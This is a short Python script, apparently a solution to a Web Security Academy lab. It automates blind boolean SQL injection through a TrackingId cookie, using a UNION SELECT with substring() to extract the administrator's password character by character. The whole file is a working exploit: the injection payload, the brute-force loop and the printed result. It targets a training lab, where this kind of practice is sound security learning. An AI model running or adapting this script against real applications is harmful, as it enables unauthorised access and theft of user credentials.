import requests
import string

# Author : 0x2nac0nda

def get_admin_password(url, character_set):
    # Initialize session and headers
    session = requests.Session()
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cache-Control": "max-age=0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0",
        "Connection": "close",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate"
    }

    # Initialize the found password
    found_password = ""

    # Iterate over each character position of the password
    for position in range(1, 21):
        for character in character_set:
            # Construct the SQL injection query
            injection_query = f"cc'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{position},1)='{character}' -- -"

            # Set the cookies with the injection query
            cookies = {
                "TrackingId": injection_query,
                "session": "7sZR51uSzYp8t4WQLggNSBUwPiHrDVt5"
            }

            try:
                # Make the request
                response = session.get(url, headers=headers, cookies=cookies)

                if 'Welcome back!' in response.text:
                    found_password += character
                    print(found_password)
                    break
            except requests.RequestException as e:
                print(f"An error occurred: {e}")
                continue

    return found_password

# URL for the request
url = "https://0adf0008049c408881d5bcca00810076.web-security-academy.net/"

# Character set to test for each password character
character_set = string.ascii_letters + string.digits

# Find the administrator password
admin_password = get_admin_password(url, character_set)
print(f'[+] Found administrator password: {admin_password}')
